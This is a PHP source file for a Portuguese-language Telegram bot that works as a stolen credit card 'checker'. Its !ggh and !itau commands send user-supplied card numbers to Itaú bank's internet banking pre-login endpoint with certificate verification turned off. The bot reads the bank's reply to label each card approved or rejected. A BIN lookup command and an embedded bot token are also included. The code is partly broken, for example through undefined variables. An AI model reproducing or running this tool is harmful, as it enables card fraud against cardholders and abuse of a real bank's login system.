<?php

///DONO: @SupremoVpsPro
///BOT CENTRAL SUPREME

$botToken = "1753028961:AAGjVdVL2xd61A1t43wrxQfQ5FFhRTXG_CA"; //Insira seu token do bot
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

//=========[Iniciar o Comando]=========//

if ((strpos($message, "!start") === 0)||(strpos($message, "/start") === 0)){
sendMessage($chatId, "<b>OLÁ, SEJA BEM VINDO $firstname!!%0ADigite /menu para saber todos os meus comandos!!%0A</b>");
}

//=========[Comando Menu]=========//

if ((strpos($message, "!menu") === 0)||(strpos($message, "/menu") === 0)){
sendMessage($chatId, "<b>OLÁ, SEJA BEM VINDO $firstname use /consulta para ver o menu de consulta , para consulta suas cc execute o comando: /cc , para consulta logins execute /log 
créditos para @JVPROGRAMADOR%0A</b>");
//sendMessage($chatId, "<u>Bin lookup:</u> <code>!bin</code> xxxxxx%0A<u>Hiper gg:</u> <code>!ggh</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Stripe:</u> <code>!chk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Info:</u> <code>/info</code> Para saber sua informação%0A%0A<b>BOT FEITO POR: @SupremoVpsPro</b>");

}
//checker de consulta
if ((strpos($message, "!consulta") === 0)||(strpos($message, "/consulta") === 0)){
sendMessage($chatId, "<b>OLÁ, SEJA BEM VINDO $firstname 0 menu em desenvolvimento %0A</b>");
}
//=========[Comand
///checker de logina\\
if ((strpos($message, "!log") === 0)||(strpos($message, "/log") === 0)){



sendMessage($chatId, "<b>OLÁ, SEJA BEM VINDO $firstname 0 menu em desenvolvimento </b>");
}


//=======[checker]=====\\\
if ((strpos($message, "!cc") === 0)||(strpos($message, "/cc") === 0)){

sendMessage($chatId, "<b>OLÁ, SEJA BEM VINDO $firstname!! 0 menu em desenvolvimento %0A</b>");
}
//=========[Comando de Informação]=========//

elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "<u>ID:</u> <code>$userId</code>%0A<u>First Name:</u> $firstname%0A<u>Username:</u> @$username%0A");
}

//=========[Comando de GG hiper]=========//

elseif ((strpos($message, "!ggh") === 0)||(strpos($message, "/ggh") === 0)){
$lista = substr($message, 5);
error_reporting(0);
$i = explode("|", $lista);
$cc = $i[0];
$mes = $i[1];
$ano = $i[2];
$cvv = $i[3];

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end, $str[1]);
	return $str[0];
}	
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://internetnc2.itau.com.br/router-app/router");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_ENCODING, "gzip"); //QUEBRAR CRIPTOGRAFIA
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36");
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: internetnc2.itau.com.br',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://internetnc.itau.com.br',
    'Referer: https://internetnc.itau.com.br/',
    'Upgrade-Insecure-Requests: 1',
    'Connection: Keep-Alive'));
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'usuario.cartao='.$cc.'&usuario.cnpj=&portal=003&pre-login=pre-login&destino=&tipoLogon=9');
	$resposta = curl_exec($ch);
	
	
if (strpos($resposta, 'Digite sua senha')){
sendMessage($chatId, "<b>🟢APROVADA🟢</b>%0A<u>CARD:</u> <code>$cc|$mes|$ano|$cvv</code>%0A<u>RESPONSE:</u> 🟢CARTÃO VALIDO🟢%0A<u>Verified by:</u> @$username %0A");
}else{
sendMessage($chatId, "<b>🔴REPROVADA🔴</b>%0A<u>CARD:</u> <code>$cc|$mes|$ano|$cvv</code>%0A<u>RESPONSE:</u> 🔴CARTÃO INVALIDO🔴%0A<u>Verified by:</u> @$username %0A");
}
}

    //=========[Bin Command]=========//

elseif ((strpos($message, "!bin") === 0)||(strpos($message, "/bin") === 0)){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');

if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}
curl_close($ch);

sendMessage($chatId, '<b>🟢BIN VALIDO</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.''.$emoji.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Currency:</b> '.$currency.'%0A<b>Checked By:</b> @'.$username.'%0A');
}
//---itau--\\
elseif ((strpos($message, "!itau") === 0)||(strpos($message, "/ccitau") === 0)){

$lista = substr($message, 5);

error_reporting(0);
$i = explode("|", $lista);
$cc = $i[0];
$mes = $i[1];
$ano = $i[2];
$cvv = $i[3];

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end, $str[1]);
	return $str[0];
}	
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://internetnc2.itau.com.br/router-app/router");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_ENCODING, "gzip"); //QUEBRAR CRIPTOGRAFIA
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36");
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: internetnc5.itau.com.br',
'User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:89.0) Gecko/20100101 Firefox/89.0',
'Content-Type: application/x-www-form-urlencoded',
'Referer: https://www.itau.com.br/',
'Origin: https://www.itau.com.br'
)); 
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'usuario.cartao='.$cc.'&portal=999&pre-login=pre-login&usuario.cpf=&tipoLogon=9');
	$resposta = curl_exec($ch);
	$nome = getStr($data1, '<h1>', '</h1>');
	
if (strpos($resposta, 'no teclado virtual')){
sendMessage($chatId, "<b>🟢APROVADA🟢</b>%0A<u>CARD:</u> <code>$cc|$mes|$ano|$cvv|$nome|</code>%0A<u>RESPONSE:</u> 🟢CARTÃO VALIDO🟢%0A<u>Verified by:</u> @$username %0A");
}else{if (strpos($data1, 'verifique')) {
sendMessage($chatId, "<b>🔴REPROVADA🔴</b>%0A<u>CARD:</u> <code>$cc|$mes|$ano|$cvv</code>%0A<u>RESPONSE:</u> 🔴CARTÃO INVALIDO🔴%0A<u>Verified by:</u> @$username %0A");

}else{if (strpos($data1, 'bloqueado')) {
sendMessage($chatId, "<b>🔴REPROVADA🔴</b>%0A<u>CARD:</u> <code>$cc|$mes|$ano|$cvv</code>%0A<u>RESPONSE:</u> 🔴CARTÃO INVALIDO🔴%0A<u>Verified by:</u> @$username %0A");


}else{ if (strpos($data1, 'site errado.')) {
sendMessage($chatId, "<b>🔴REPROVADA🔴</b>%0A<u>CARD:</u> <code>$cc|$mes|$ano|$cvv</code>%0A<u>RESPONSE:</u> 🔴CARTÃO INVALIDO🔴%0A<u>Verified by:</u> @$username %0A");

}else{ if (strpos($data1, 'validar')) {}
sendMessage($chatId, "<b>🔴REPROVADA🔴</b>%0A<u>CARD:</u> <code>$cc|$mes|$ano|$cvv</code>%0A<u>RESPONSE:</u> 🔴CARTÃO INVALIDO🔴%0A<u>Verified by:</u> @$username %0A");
}
}
}
}
}
curl_close($ch);

function sendMessage ($chatId, $message){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);      
}

?>